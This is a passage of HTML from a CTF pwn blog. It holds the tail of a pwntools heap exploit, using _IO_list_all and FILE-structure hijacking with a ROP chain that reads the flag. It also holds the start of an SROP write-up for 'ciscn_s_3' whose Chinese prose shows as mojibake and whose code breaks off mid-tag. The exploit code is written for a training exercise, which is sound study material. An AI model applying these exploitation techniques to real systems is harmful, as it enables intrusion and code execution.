class="string">b&quot;?\n&quot;</span>, city[city_to])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">city_from, city_to</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_to])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">city_from, city_to, num, size, note</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_to])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;change?\n&quot;</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;far?\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note:\n&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>(<span class="params">city_num</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_num])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">calculate(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;fence&quot;</span>)</span><br><span class="line">delete(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1000</span>, <span class="string">b&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span> + <span class="string">b&quot;|&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = (recv(<span class="string">b&quot;\n&quot;</span>) &lt;&lt; <span class="number">0x8</span>) - <span class="number">0x2400</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;add&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;b&quot;</span> * <span class="number">0xF</span> + <span class="string">b&quot;|&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x1F6CE0</span></span><br><span class="line">offset = <span class="number">0x21ACE0</span></span><br><span class="line"></span><br><span class="line">libc_addr = recv(<span class="string">b&quot;\n&quot;</span>) - offset</span><br><span class="line">_IO_list_all = libc_addr + libc.sym._IO_list_all</span><br><span class="line">setcontext = libc_addr + libc.sym.setcontext + <span class="number">61</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># delete(4, 0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p32(<span class="number">0</span>) + p32(<span class="number">3</span>) + p32(<span class="number">0x3000</span>) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">delete(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1000</span>, <span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = heap_addr + <span class="number">0x2940</span></span><br><span class="line">fake_vtable_addr = heap_addr + <span class="number">0x2940</span> + <span class="number">0xF0</span></span><br><span class="line"><span class="comment"># _IO_wstrn_jumps = libc_addr + 0x1F3340 - 0x18</span></span><br><span class="line">_IO_wstrn_jumps = libc_addr + <span class="number">0x2171C0</span> - <span class="number">0x18</span></span><br><span class="line">orw_addr = fake_vtable_addr + <span class="number">0x80</span></span><br><span class="line">attack_addr = heap_addr + <span class="number">0x800</span></span><br><span class="line"><span class="comment"># gadget = libc_addr + 0x0000000000126FA8</span></span><br><span class="line"><span class="comment"># 0x0000000000126fa8: mov rdx, rax; call qword ptr [rbx + 0x28];</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000085251: mov rdx, qword ptr [rbx + 0x40]; mov rdi, rbx; sub rdx, rsi; call qword ptr [rax + 0x70];</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gadget = libc_addr + 0x000000000010AA6F</span></span><br><span class="line">gadget = libc_addr + <span class="number">0x0000000000085251</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = attack_addr</span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rsp = attack_addr + <span class="number">8</span></span><br><span class="line">frame.rip = libc_addr + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">orw = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">fake_vtable = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_vtable += p64(setcontext)</span><br><span class="line">fake_vtable += p64(gadget)</span><br><span class="line">fake_vtable = fake_vtable.ljust(<span class="number">0x70</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_vtable += p64(setcontext)</span><br><span class="line">fake_vtable += p64(<span class="number">0</span>)</span><br><span class="line">fake_vtable += orw</span><br><span class="line"></span><br><span class="line">fake_wide_data = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0x18</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_wide_data += p64(<span class="number">1</span>)</span><br><span class="line">fake_wide_data += p64(<span class="number">2</span>)</span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0xE0</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_wide_data += p64(fake_vtable_addr)</span><br><span class="line">fake_wide_data += p64(<span class="number">0</span>)</span><br><span class="line">fake_wide_data += fake_vtable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;p&quot;</span> * <span class="number">0x500</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x531</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(_IO_list_all - <span class="number">0x20</span>)</span><br><span class="line">payload += <span class="string">b&quot;o&quot;</span> * <span class="number">0x508</span></span><br><span class="line">payload += p64(<span class="number">0x521</span>)</span><br><span class="line">payload += fake_wide_data.ljust(<span class="number">0x510</span>, <span class="string">b&quot;q&quot;</span>)</span><br><span class="line"><span class="comment"># payload += b&quot;q&quot; * 0x510</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_io = p64(<span class="number">0x800</span>)</span><br><span class="line">fake_io += p64(<span class="number">0x521</span>)</span><br><span class="line">fake_io += p64(libc_addr + offset) * <span class="number">2</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x38</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io += p64(orw_addr)  <span class="comment">#                 &lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line">fake_io += p64(orw_addr + <span class="number">0xFFFFFFFF</span>)  <span class="comment">#                 &lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line">fake_io += p64(orw_addr + <span class="number">0xFFFFFFFF</span>)  <span class="comment">#                 &lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xA0</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io += p64(fake_wide_data_addr)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xC0</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io += p64(<span class="number">1</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(_IO_wstrn_jumps)</span><br><span class="line"></span><br><span class="line">payload += fake_io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ls(heap_addr)</span><br><span class="line">ls(libc_addr)</span><br><span class="line">ls(_IO_list_all)</span><br><span class="line">ls(_IO_list_all - libc_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;.&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, transport[<span class="number">2</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name&quot;</span>, city[<span class="number">4</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name&quot;</span>, city[<span class="number">3</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;far?&quot;</span>, <span class="built_in">str</span>(<span class="number">1000</span>).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Note:&quot;</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add(2, 4, 3, 1000, b&quot;cccc&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym.<span class="built_in">open</span> + libc_addr</span><br><span class="line">read_addr = libc.sym.read + libc_addr</span><br><span class="line">puts_addr = libc.sym.puts + libc_addr</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00000000000240e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002573e: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000026302: pop rdx; ret;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x000000000002a3e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002be51: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x000000000011f2e7: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop_rdi = libc_addr + 0x240E5</span></span><br><span class="line"><span class="string">pop_rsi = libc_addr + 0x2573E</span></span><br><span class="line"><span class="string">pop_rdx = libc_addr + 0x26302</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2A3E5</span></span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x000000000002BE51</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x000000000011F2E7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(attack_addr)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># _IO_switch_to_wget_mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/23/writeup4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/23/writeup4/" class="post-title-link" itemprop="url"> [CTF pwn] ciscn_s_3 write up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-02-23 15:49:40" itemprop="dateCreated datePublished" datetime="2024-02-23T15:49:40+08:00">2024-02-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-14 23:47:35" itemprop="dateModified" datetime="2024-10-14T23:47:35+08:00">2024-10-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æ˜¨å¤©åšäº†ä¸€ä¸ªæ™šä¸Šçš„éº»çƒ¦é¢˜ï¼Œç ”ç©¶äº†å¥½é•¿æ—¶é—´ä¹Ÿæ²¡åœ¨æœ¬åœ°æ‰“é€šï¼Œç»“æœç¬¬äºŒå¤©æ—©ä¸Šä¸€è¯•è¿œç¨‹å°±é€šäº†ï¼Œä¼°è®¡æœ¬åœ°ç¯å¢ƒæ²¡æœ‰æ­å¥½</p>
<p>é¦–å…ˆchecksecä¸€ä¸‹ï¼š</p>
<p><img src="/images/writeup/4/1.png" alt="1"></p>
<p>å¾ˆå¹³å¸¸çš„64ä½ç¨‹åºï¼Œåªå¼€äº†ä¸€ä¸ªNXï¼Œæ¥ç€è¿›ida64ï¼š</p>
<p>mainå‡½æ•°ç›´æ¥è·³è½¬åˆ°äº†vulnå‡½æ•°ï¼Œæˆ‘ä»¬å…ˆåˆ†ævulnå‡½æ•°ï¼š</p>
<p><img src="/images/writeup/4/2.png" alt="2"></p>
<p>æ³¨æ„è¿™é‡Œçš„sys_readä¸sys_writeï¼Œå®ƒä»¬å’Œä¹‹å‰çš„readå’Œwriteåº“å‡½æ•°æ˜¯ä¸åŒçš„ã€‚ä»”ç»†åˆ†æå‘ç°å·¦ä¾§çš„å‡½æ•°è¡¨ä¸­å¹¶æ²¡æœ‰readå’Œwriteå‡½æ•°ã€‚æˆ‘ä»¬ç›´æ¥çœ‹æ±‡ç¼–ï¼š</p>
<p><img src="/images/writeup/4/3.png" alt="3"></p>
<p>è¿™é‡Œç”¨åˆ°çš„æŒ‡ä»¤æ˜¯syscallã€‚ä¸Šç½‘ä¸Š<a target="_blank" rel="noopener" href="https://blog.csdn.net/shuzishij/article/details/87005219">æŸ¥äº†æŸ¥</a>ï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯ç”¨æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„ï¼Œæ ¹æ®raxå¯„å­˜å™¨çš„å€¼æ¥æ‰§è¡Œä¸åŒçš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¼ å‚ç”¨çš„å¯„å­˜å™¨ä¾æ—§æ˜¯rdiï¼Œrsiï¼Œrdxç­‰ã€‚</p>
<p>è¿™ä¸ªæŒ‡ä»¤å’Œ32ä½çš„int 80hä¸­æ–­å¾ˆç›¸ä¼¼ï¼Œåªä¸è¿‡åè€…ä¼ å‚ç”¨å¯„å­˜å™¨æ˜¯ebxï¼Œecxç­‰ï¼Œè€Œä¸”è°ƒç”¨è¡¨ä¹Ÿä¸ä¸€æ ·ã€‚(32ä½çš„execveæ˜¯11,64ä½çš„æ˜¯59ï¼Œå³0x3B)</p>
<p>ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ—¶raxä¸º0ï¼Œè°ƒç”¨çš„ä¾¿æ˜¯sys_readï¼Œç¬¬äºŒä¸ªraxä¸º1ï¼Œè°ƒç”¨çš„ä¾¿æ˜¯sys_writeï¼›</p>
<p>è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„æ˜¯è¯¥ç¨‹åºpushäº†rbpä¹‹åæ²¡æœ‰leaveï¼Œæ‰€ä»¥æ­£å¸¸æ˜¯æ— æ³•æ­£ç¡®é€€å‡ºçš„ï¼Œæˆ‘ä»¬æ„é€ æº¢å‡ºæ—¶å°±ä¸ç”¨è¡¥rbpäº†</p>
<p>äº†è§£äº†è¿™ç‚¹åæˆ‘ä»¬å†æ¥ç€åˆ†æï¼Œå‘ç°bufå¾ˆæ˜¾ç„¶å­˜åœ¨æº¢å‡ºé£é™©ï¼Œå¯ä»¥å°è¯•æ„é€ ROPé“¾è¿›è¡Œæ”»å‡»ï¼›</p>
<p>æ³¨æ„åˆ°ç¨‹åºé‡Œçš„gadgetså‡½æ•°ï¼š</p>
<p>åæ±‡ç¼–ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹æ±‡ç¼–ï¼š</p>
<p><img src="/images/writeup/4/4.png" alt="4"></p>
<p>ç»“åˆç¨‹åºç»™å‡ºçš„syscallï¼Œè¿™é‡Œæœ‰ä¸¤æ®µgadgetå¯ä»¥åˆ©ç”¨ï¼Œä¸€ä¸ªæ˜¯0x4004DAæ®µå¯ä»¥å°†raxè®¾ç½®ä¸º0xFï¼Œå¦ä¸€ä¸ª0x4004E2æ®µå¯ä»¥å°†raxè®¾ç½®ä¸º0x3Bï¼›</p>
<p>æ ¹æ®ä¸Šé¢çš„è¡¨ï¼Œå‰è€…æŒ‡å‘çš„æ˜¯rt_sigreturnï¼Œåè€…æŒ‡å‘çš„æ˜¯execveï¼Œæ¥ä¸‹æ¥ROPé“¾çš„æœ‰ä¸¤ä¸ªæ–¹å‘ï¼›</p>
<p>æ— è®ºæ˜¯å“ªä¸ªæ–¹å‘ï¼Œéƒ½éœ€è¦ä¸€ä¸ªæŒ‡å‘â€&#x2F;bin&#x2F;shâ€çš„åœ°å€ï¼Œç”±äºç¨‹åºé‡Œæ²¡æœ‰ç›¸å…³å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ ˆä¸Šæ„é€ &#x2F;bin&#x2F;shå¹¶æ³„éœ²æ ˆåœ°å€ï¼Œç¬¬ä¸€æ³¢æ”»å‡»æ€è·¯ä¾¿æ˜¯åˆ©ç”¨sys_writeè¾“å‡ºçš„0x30ä¸ªå­—ç¬¦ä¸­æ‰¾åˆ°å’Œæ ˆåœ°å€ç›¸å…³çš„æ•°æ®ï¼›</p>
<p>å…ˆæ¥gdbè°ƒè¯•ä¸€ä¸‹å­ï¼š</p>
<p><img src="/images/writeup/4/stack.png" alt="stack"></p>
<p>è¿™æ˜¯retæ—¶çš„æ ˆç»“æ„ï¼Œå¯ä»¥çœ‹å‡ºæ²¡æœ‰leaveå¯¼è‡´retçš„åœ°å€æŒ‡å‘äº†rbpè€Œä¸æ˜¯ä¸‹ä¸€ä¸ª0x400536ï¼Œæˆ‘ä»¬å†çœ‹çœ‹å®ƒè¾“å‡ºçš„0x30ä¸ªå­—ç¬¦ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<img src="/images/writeup/4/6.png" alt="6" style="zoom:67%;" />

<p>è¿™é‡Œå’Œgdbåˆ†æçš„ä¸€æ ·ï¼Œæˆ‘ä»¬è¦†ç›–çš„rbpçš„åé¢ç´§æ¥ç€å°±æ˜¯åœ°å€0x400536ï¼Œæ³¨æ„åˆ°åœ¨æ¥ä¸‹æ¥çš„åœ°å€æŒ‡å‘äº†ä¸€ä¸ªæŸä¸€ä¸ªæ ˆåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ³„éœ²æ¥è®¡ç®—bufåœ°å€çš„åç§»ï¼Œä»è€Œåœ¨æ ˆä¸Šæ„é€ &#x2F;bin&#x2F;shï¼›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stackAddr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stackAddr))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„stackAddræŒ‡å‘çš„æ˜¯bufçš„åŸºåœ°å€ï¼Œä¸‹ä¸€è½®æˆ‘ä»¬ç›´æ¥åœ¨payloadçš„æœªæº¢å‡ºéƒ¨åˆ†å†™å…¥&#x2F;bin&#x2F;shï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬æœ‰sigreturnå’Œexecveä¸¤ä¸ªæ–¹å‘ï¼Œ</p>
<p>å¯¹äºå‰è€…ï¼Œæˆ‘åœ¨CTFwikiä¸ŠæŸ¥åˆ°äº†<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">ç›¸å…³èµ„æ–™ä»¥åŠåˆ©ç”¨æ‰‹æ®µ</a>ï¼Œå‚è€ƒäº†ç»™çš„ä¾‹é¢˜ä»¥åŠç½‘ä¸Šå…¶ä»–çš„write upå°è¯•æ„é€ äº†ä¸€ä»½ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = stackAddr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stackAddr</span><br><span class="line">sigframe.rip = syscall_retAddr</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†æŠŠå®ƒæ¥åˆ°syscallçš„åé¢ä½œä¸ºä¼ªé€ çš„signal Frame ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±èƒ½æ‹¿åˆ°flagäº†ï¼š</p>
<p><img src="/images/writeup/4/final.png" alt="final"></p>
<p>è¿™ç§æƒ…å†µçš„å®Œæ•´expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../ciscn_s_3&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">port = <span class="number">29144</span></span><br><span class="line">ip = <span class="string">&quot;61.147.171.105&quot;</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"><span class="comment">#==================rop==================#</span></span><br><span class="line">mainAddr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">bdrAddr = <span class="number">0x4004d7</span></span><br><span class="line">syscall_retAddr = <span class="number">0x0000000000400517</span></span><br><span class="line"><span 